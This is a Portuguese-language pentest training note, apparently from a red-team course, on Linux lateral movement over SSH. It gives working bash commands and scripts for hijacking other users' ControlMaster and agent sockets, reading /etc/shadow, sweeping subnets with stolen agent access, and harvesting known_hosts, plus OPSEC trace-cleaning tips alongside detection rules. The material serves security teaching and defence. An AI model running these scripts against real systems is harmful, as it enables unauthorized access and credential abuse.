---
layout: cyber
section: lateral
title: "Movimento Lateral em Linux via SSH"
---

# Movimento Lateral em Linux via SSH

## Criptografado, Esperado, Difícil de Detectar

SSH é o protocolo de acesso remoto padrão em ambientes Linux e Unix. Em ambientes corporativos com dezenas ou centenas de servidores Linux, SSH é onipresente — e seu uso legítimo torna a detecção difícil. Movimento lateral via SSH geralmente não é detectado por soluções tradicionais porque o protocolo é criptografado, conexões SSH são esperadas, e mecanismos como ControlMaster e Agent Forwarding são features legítimas sendo abusadas, não exploits.

Entender SSH além do básico (usuário + senha) significa poder reutilizar conexões existentes de outros usuários, usar chaves que não se possui, e mapear conexões de confiança entre hosts. ATT&CK relacionado: T1021.004 (SSH), T1552.004 (Private Keys), T1563 (Remote Service Session Hijacking), T1563.001 (SSH Hijacking).

---

## ControlMaster, Agent Forwarding e Hijacking de Sessão

### Arquitetura SSH

```
+----------+     TCP 22     +----------+
|  Cliente |  <----------->  | Servidor |
|  (Kali)  |   criptografado | (alvo)   |
+----------+                 +----------+
     |
     | Armazena chaves em ~/.ssh/known_hosts
     | Usa chave privada em ~/.ssh/id_rsa
     | Fala com SSH Agent via socket UNIX
```

### SSH Agent

O SSH Agent e um daemon que armazena chaves privadas descriptografadas em memoria. Quando voce conecta via SSH com chave protegida por passphrase, o agent armazena a chave descriptografada para uso futuro sem pedir a passphrase novamente.

```
+----------+  Unix Socket  +------------+
|  ssh cli |  <-----------> | ssh-agent  |
|          |  /tmp/ssh-XXXX |            |
+----------+  /agent.PID    | (em memoria|
                            |  tem chave |
                            |  privada)  |
                            +------------+
```

### SSH Multiplexing (ControlMaster)

ControlMaster permite multiplas conexoes SSH compartilharem um unico transporte TCP. A primeira conexao cria um socket de controle. Conexoes subsequentes usam esse socket sem precisar autenticar novamente.

```
Conexao 1 (master):
usuario → ssh -o ControlMaster=yes -o ControlPath=/tmp/ctrl-%r@%h:%p servidor
        → cria /tmp/ctrl-user@servidor:22

Conexao 2 (slave, sem autenticacao):
usuario → ssh -o ControlPath=/tmp/ctrl-%r@%h:%p servidor
        → usa socket existente, conecta instantaneamente
```

---

## Na Pratica

### Reconhecimento SSH

Antes de tentar hijacking, mapear o ambiente:

```bash
# Ver conexoes SSH ativas no sistema
ss -tlnp | grep ':22'
ss -tnp | grep 'ESTABLISHED.*:22'
netstat -tnp 2>/dev/null | grep ':22'

# Identificar usuarios com SSH aberto
w         # ver terminais pts e origem
who       # ver logins ativos
last      # historico de logins SSH

# Verificar sockets ControlMaster existentes
find /tmp -name "*.ssh" 2>/dev/null
find /tmp -name "ssh-*" 2>/dev/null
ls /tmp/ssh-* 2>/dev/null
find /run/user -name "ssh-*" 2>/dev/null

# Identificar SSH Agent sockets
find /tmp -name "agent.*" 2>/dev/null
ls /tmp/ssh-*/agent.* 2>/dev/null

# Ver variaveis de ambiente dos processos SSH
for pid in $(pgrep ssh); do
    echo "PID $pid:"
    cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep SSH
done
```

---

## Exemplos de Codigo / Comandos

### 1. SSH ControlMaster Hijacking

#### O Que e e Por Que Funciona

Quando um usuario configura ControlMaster, o SSH cria um arquivo socket Unix. Qualquer processo com permissao de leitura nesse socket pode fazer conexoes SSH usando a autenticacao existente sem precisar de senha ou chave.

O socket geralmente pertence ao usuario que abriu a conexao. Para abusar o socket de outro usuario, e necessario:
- Ser root
- Estar no mesmo grupo do usuario
- Ter outro vetor de acesso ao socket (como estar no mesmo diretorio compartilhado)

#### Identificar Sockets Ativos

```bash
# Busca ampla por sockets SSH
find /tmp -type s 2>/dev/null
find /tmp -name "*.ssh" -o -name "ssh-*" 2>/dev/null
ls -la /tmp/ssh-*/ 2>/dev/null

# Como root - ver sockets de outros usuarios
find /tmp -type s -user root 2>/dev/null
find /tmp -type s 2>/dev/null | xargs ls -la 2>/dev/null

# Ver processos com SSH connections
ss -tp | grep ssh
```

Saida de exemplo:
```
/tmp/ssh-XXXXXX/agent.12345   (socket de agent)
/tmp/ssh-ctrl-root@prod-01:22 (socket de ControlMaster)
```

#### Usar Socket ControlMaster Existente

```bash
# Se encontrou socket /tmp/ctrl-root@servidor:22
ssh -S /tmp/ctrl-root@servidor:22 root@servidor hostname
ssh -S /tmp/ctrl-root@servidor:22 root@servidor "cat /etc/shadow"

# Executar multiplos comandos via socket
ssh -S /tmp/ctrl-root@servidor:22 -T root@servidor <<'EOF'
whoami
id
cat /root/.ssh/authorized_keys
ls /home
EOF

# Abrir sessao interativa usando socket de outro usuario
ssh -S /tmp/ctrl-root@servidor:22 root@servidor
```

#### Configurar ControlMaster para Criar Socket Automaticamente

Para preparar o ambiente para uso futuro, configurar em `~/.ssh/config`:

```sshconfig
Host *
    ControlMaster auto
    ControlPath ~/.ssh/cm/%r@%h:%p
    ControlPersist 10m

Host prod-*
    ControlMaster auto
    ControlPath /tmp/ssh-ctrl-%r@%h-%p
    ControlPersist 30m
    StrictHostKeyChecking no
```

Criar o diretorio:
```bash
mkdir -p ~/.ssh/cm
chmod 700 ~/.ssh/cm
```

Com essa configuracao, cada nova conexao SSH cria um socket. Depois de 10 minutos sem uso (`ControlPersist 10m`), o master se desconecta.

#### Script para Enumeracao de Sockets

```bash
#!/bin/bash
# enum_ssh_sockets.sh - enumerar sockets ControlMaster no sistema

echo "[*] Procurando sockets SSH ControlMaster..."
find /tmp /var/tmp /run/user -type s 2>/dev/null | while read socket; do
    echo "[+] Socket encontrado: $socket"
    # Tentar usar o socket
    if ssh -S "$socket" -o BatchMode=yes -o ConnectTimeout=3 dummy@dummy hostname 2>/dev/null; then
        echo "    [!] Socket funcional!"
    fi
done

echo ""
echo "[*] Procurando SSH Agent sockets..."
find /tmp -name "agent.*" 2>/dev/null | while read sock; do
    echo "[+] Agent socket: $sock"
    owner=$(ls -la "$sock" 2>/dev/null | awk '{print $3}')
    echo "    Dono: $owner"
done
```

---

### 2. SSH Agent Forwarding Abuse

#### O Que e SSH Agent Forwarding

Quando voce conecta a um servidor com `-A` (agent forwarding), o servidor pode fazer requisicoes ao seu SSH agent local. Isso permite que voce, conectado ao servidor A, use sua chave local para conectar ao servidor B sem copiar a chave.

```
+--------+    SSH + Agent    +----------+    SSH c/ chave local    +----------+
|  Kali  | <--------------> | Servidor A| <---------------------> | Servidor B|
|        |  Forwarded agent  |          |  (usa agent do Kali)    |          |
+--------+                  +----------+                          +----------+
         \                       |
          \                      | SSH_AUTH_SOCK = /tmp/ssh-XXX/agent.123
           \                     | (socket no Servidor A que fala com agent no Kali)
            \____________________/
```

#### O Perigo do Agent Forwarding

Se um administrador conecta ao Servidor A com `-A` e voce comprometeu o Servidor A com acesso root, voce pode:
1. Ver o socket do agent dele
2. Usar o socket para conectar a outros hosts como ele

Voce nao consegue extrair a chave privada (ela esta no agent, nao no disco), mas pode usar o agent para autenticar.

#### Identificar Agent Sockets

```bash
# Ver variavel SSH_AUTH_SOCK do proprio processo
echo $SSH_AUTH_SOCK

# Ver SSH_AUTH_SOCK de todos os processos (requer root)
for pid in $(ls /proc | grep '^[0-9]'); do
    env_file="/proc/$pid/environ"
    if [ -r "$env_file" ]; then
        result=$(cat "$env_file" 2>/dev/null | tr '\0' '\n' | grep SSH_AUTH_SOCK)
        if [ -n "$result" ]; then
            user=$(ps -p $pid -o user= 2>/dev/null)
            echo "PID $pid (usuario: $user): $result"
        fi
    fi
done

# Alternativa mais simples (requer root)
grep -r SSH_AUTH_SOCK /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep SSH_AUTH_SOCK

# Ver sockets de agent
find /tmp -name "agent.*" 2>/dev/null
ls -la /tmp/ssh-*/
```

#### Usar Agent de Outro Usuario (requer root ou acesso ao socket)

```bash
# Encontrado: /tmp/ssh-AbCdEf/agent.12345 pertencendo ao usuario "deploy"

# Como root, usar o agent do usuario deploy
SSH_AUTH_SOCK=/tmp/ssh-AbCdEf/agent.12345 ssh-add -l
# Lista as chaves carregadas no agent (sem revelar a chave privada)

SSH_AUTH_SOCK=/tmp/ssh-AbCdEf/agent.12345 ssh deploy@servidor_destino

# Executar comando
SSH_AUTH_SOCK=/tmp/ssh-AbCdEf/agent.12345 ssh user@192.168.1.50 "whoami && id"

# Tentar varios hosts com as chaves do agent
SSH_AUTH_SOCK=/tmp/ssh-AbCdEf/agent.12345 ssh -o StrictHostKeyChecking=no user@192.168.1.0/24
```

#### Script para Abuso de Agent Forwarding

```bash
#!/bin/bash
# abuse_agent_forwarding.sh

TARGET_RANGE="192.168.1"
USERS=("root" "admin" "ubuntu" "deploy" "jenkins" "git")

# Listar todos agents disponiveis
echo "[*] Enumerando SSH Agent sockets..."
AGENTS=$(find /tmp -name "agent.*" 2>/dev/null)

for agent_sock in $AGENTS; do
    echo ""
    echo "[+] Testando agent: $agent_sock"
    
    # Ver chaves disponiveis
    keys=$(SSH_AUTH_SOCK="$agent_sock" ssh-add -l 2>/dev/null)
    if [ -n "$keys" ]; then
        echo "[!] Chaves encontradas:"
        echo "$keys"
        
        # Tentar conectar em hosts da subnet
        for i in $(seq 1 254); do
            for user in "${USERS[@]}"; do
                result=$(SSH_AUTH_SOCK="$agent_sock" ssh \
                    -o StrictHostKeyChecking=no \
                    -o BatchMode=yes \
                    -o ConnectTimeout=2 \
                    "$user@${TARGET_RANGE}.${i}" \
                    "echo OK:$(hostname):$(id)" 2>/dev/null)
                if [[ "$result" == OK:* ]]; then
                    echo "[!!!] ACESSO: $user@${TARGET_RANGE}.${i} -> $result"
                fi
            done
        done
    fi
done
```

#### Configurar Agent Forwarding Propositalmente

Para habilitar Agent Forwarding na nossa propria sessao (para pivoting):

```bash
# Conectar com agent forwarding habilitado
ssh -A usuario@JUMP_HOST

# Verificar se forwarding funcionou
echo $SSH_AUTH_SOCK  # deve mostrar socket no servidor remoto

# Agora do JUMP_HOST, conectar ao proximo hop sem senha
ssh usuario@SERVIDOR_INTERNO  # usa agent forwarding

# Configurar em ~/.ssh/config para hosts especificos
Host jump.empresa.com
    ForwardAgent yes
    User devops

Host *.interno
    ForwardAgent yes
    ProxyJump jump.empresa.com
```

---

### 3. known_hosts Pivoting

O arquivo `~/.ssh/known_hosts` contem as chaves publicas de todos os servidores que o usuario ja conectou. E um mapa de confianca que pode revelar:
- Quais hosts existem na rede interna
- Nomes de hosts que nao aparecem em DNS
- Padrao de acesso do usuario (quais servidores ele administra)

#### Extrair e Analisar known_hosts

```bash
# Ver known_hosts do usuario atual
cat ~/.ssh/known_hosts

# Formato sem hashing:
# hostname,ip tipo_chave chave_publica
192.168.1.50 ssh-ed25519 AAAA...
prod-db-01,192.168.10.20 ssh-rsa AAAA...

# Formato com hashing (mais comum em sistemas modernos):
# |1|SALT|HASH tipo_chave chave_publica
|1|rS6YrPAbCdE=|AbCdEfGhIjKlMnOpQrStUv= ssh-ed25519 AAAA...
```

Extrair apenas hostnames (sem hashing):
```bash
# Extrair IPs e hostnames de known_hosts sem hash
awk '{print $1}' ~/.ssh/known_hosts | grep -v '|' | tr ',' '\n' | sort -u

# Extrair de todos usuarios (root)
find /home -name "known_hosts" 2>/dev/null
cat /root/.ssh/known_hosts 2>/dev/null
```

#### Desofuscar Hashes em known_hosts

Quando o sistema usa `HashKnownHosts yes` (padrao em muitas distros), os hostnames ficam hasheados. Para verificar se um host especifico esta no arquivo:

```bash
# Verificar se host especifico esta no known_hosts hasheado
ssh-keygen -F 192.168.1.50
ssh-keygen -F prod-db-01

# Se presente, mostra:
# # Host 192.168.1.50 found: line 3
# |1|SALT|HASH ssh-ed25519 AAAA...

# Tentar crackear todos os hashes (comparar com subnet)
for ip in $(seq 1 254); do
    result=$(ssh-keygen -F "192.168.1.$ip" 2>/dev/null)
    if [ -n "$result" ]; then
        echo "Encontrado: 192.168.1.$ip"
    fi
done
```

Com John the Ripper (para hashes mais complexos):
```bash
# Instalar hasher
pip install ssh-audit

# John tem suporte a known_hosts (modo ssh_known_hosts2john)
# Nao crackeia a passphrase, mas verifica se hostname esta presente
# Para brute force de known_hosts hasheados: usar hashcat mode 160 (HMAC-SHA1)
```

Script completo para pivotar via known_hosts:
```bash
#!/bin/bash
# known_hosts_pivot.sh

# Coletar todos known_hosts do sistema
echo "[*] Coletando known_hosts..."
ALL_HOSTS=()

for user_dir in /root /home/*/; do
    kh_file="$user_dir/.ssh/known_hosts"
    if [ -f "$kh_file" ]; then
        echo "[+] Processando: $kh_file"
        
        # Hosts sem hash
        awk '{print $1}' "$kh_file" | grep -v '|' | tr ',' '\n' | while read host; do
            ALL_HOSTS+=("$host")
            echo "    Host: $host"
        done
        
        # Para hashes: tentar subnet comum
        for subnet_prefix in "10.0.0" "10.10.0" "172.16.0" "192.168.1" "192.168.0"; do
            for i in $(seq 1 254); do
                ip="${subnet_prefix}.${i}"
                if ssh-keygen -F "$ip" -f "$kh_file" &>/dev/null; then
                    ALL_HOSTS+=("$ip")
                    echo "    Hash resolvido: $ip"
                fi
            done
        done
    fi
done

echo ""
echo "[*] Hosts unicos encontrados:"
printf '%s\n' "${ALL_HOSTS[@]}" | sort -u

echo ""
echo "[*] Tentando conexao SSH nos hosts encontrados..."
for host in $(printf '%s\n' "${ALL_HOSTS[@]}" | sort -u); do
    for user in root ubuntu admin deploy jenkins; do
        result=$(ssh -o BatchMode=yes \
                     -o ConnectTimeout=3 \
                     -o StrictHostKeyChecking=no \
                     "$user@$host" "echo OK:$(hostname)" 2>/dev/null)
        if [[ "$result" == OK:* ]]; then
            echo "[!!!] ACESSO SEM SENHA: $user@$host (hostname: ${result#OK:})"
        fi
    done
done
```

---

### Diagrama: Fluxo de Movimento Lateral SSH

```
COMPROMETIDO: servidor-web (usuario: www-data)
                    |
                    | Encontrou /tmp/ssh-ABCD/agent.5678 (usuario: deploy)
                    |
                    v
+-------------------------------------------+
|  SSH_AUTH_SOCK=/tmp/ssh-ABCD/agent.5678   |
|  ssh deploy@servidor-db                   |
+-------------------------------------------+
                    |
                    | Acesso via agent forwarding (sem senha!)
                    v
           servidor-db (usuario: deploy)
                    |
                    | cat ~/.ssh/known_hosts → encontrou jenkins-01
                    | ls ~/.ssh/ → id_rsa sem passphrase
                    |
                    v
+-------------------------------------------+
|  ssh -i ~/.ssh/id_rsa admin@jenkins-01    |
+-------------------------------------------+
                    |
                    v
           jenkins-01 (usuario: admin)
                    |
                    | ssh -A configurado, agent forwarded ao acessar prod-01
                    v
           prod-01 (Domain Controller equivalente)
```

---

## Deteccao e OPSEC

### O Que Gera Alertas

| Acao | Log Gerado |
|------|-----------|
| Uso de ControlMaster socket | Nenhum adicional (parece conexao SSH normal) |
| Agent forwarding abuse | `/var/log/auth.log`: SSH conexao de IP inesperado |
| Acesso a known_hosts | Acesso ao arquivo (auditd se configurado) |
| ssh-add -l em agent alheio | Acesso ao socket UNIX do agent |
| Conexoes SSH em loop (script) | Multiplas tentativas em auth.log |

### Regras de Deteccao

Regra auditd para monitorar acesso a sockets SSH:
```
-a always,exit -F arch=b64 -S connect -F path=/tmp -F filetype=socket
```

Consulta para auth.log (detectar Agent Forwarding abuse):
```bash
# Conexoes SSH de IPs nao esperados para servicos internos
grep "Accepted" /var/log/auth.log | grep -v "192.168.1.100"  # IP do bastion esperado
```

Sigma rule:
```yaml
title: SSH Agent Socket Access by Unexpected Process
detection:
  selection:
    type: socket
    path|contains: '/tmp/ssh-'
  filter:
    process|endswith:
      - '/ssh'
      - '/ssh-add'
      - '/sshd'
  condition: selection and not filter
```

### Praticas OPSEC

1. Ao usar socket de outro usuario, verificar o que ja esta logado no auth.log:
```bash
tail -5 /var/log/auth.log
```

2. Usar `-o StrictHostKeyChecking=no` gera entrada diferente no known_hosts, pode alertar o usuario

3. Limpar entradas de SSH de ~/.ssh/known_hosts apos testes:
```bash
ssh-keygen -R TARGET_IP
```

4. Agent forwarding deve ser evitado em red teams reais (risco de abuse pelo servidor comprometido)

5. Preferir ControlMaster (mais silencioso) ao Agent Forwarding em relacao a logs

---

## Módulos Relacionados

`../07_pos_exploracao_linux/02_credenciais_linux.md` cobre onde encontrar chaves SSH privadas (`~/.ssh/id_rsa`, configs de apps, histórico de shell) que alimentam as técnicas aqui descritas. `03_pivoting_e_tunelamento.md` expande SSH tunneling como veículo de pivoting para segmentos inacessíveis. `01_lateral_movement_windows.md` cobre o hop seguinte quando o próximo alvo é Windows. ATT&CK T1563.001 (SSH Hijacking) mapeia as técnicas desta nota.
- HackTricks SSH: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
